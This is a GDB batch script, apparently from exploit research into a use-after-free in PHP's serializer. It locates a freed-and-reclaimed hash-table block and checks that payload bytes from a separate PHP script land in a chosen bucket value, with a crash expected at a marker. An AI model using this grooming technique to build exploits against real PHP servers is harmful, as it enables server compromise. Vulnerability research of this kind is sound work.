set pagination off
set confirm off
set auto-load safe-path /

# M2: payload-byte -> walked-value correlation. Run with --args:
#   gdb -q -batch -x sr2_m2.gdb --args <php> -n sr2_reclaim.php marker <hex>
break php_var_serialize_destroy
run
set $d  = d
set $ht = &$d->ht
set $base = (char *)((char *)$ht->arData + 4*(int)$ht->nTableMask)
printf "== freed-and-reclaimed old arData block: %p (bucket-4 val @ %p)\n", $base, $base + 256
disable 1
continue
printf "== stop after walk (SIGSEGV expected AT THE MARKER)\n"
bt 6
info registers rdi rip
x/i $pc
printf "== groomed bucket-4 val (the bytes we chose in the PHP payload):\n"
x/2gx $base + 256
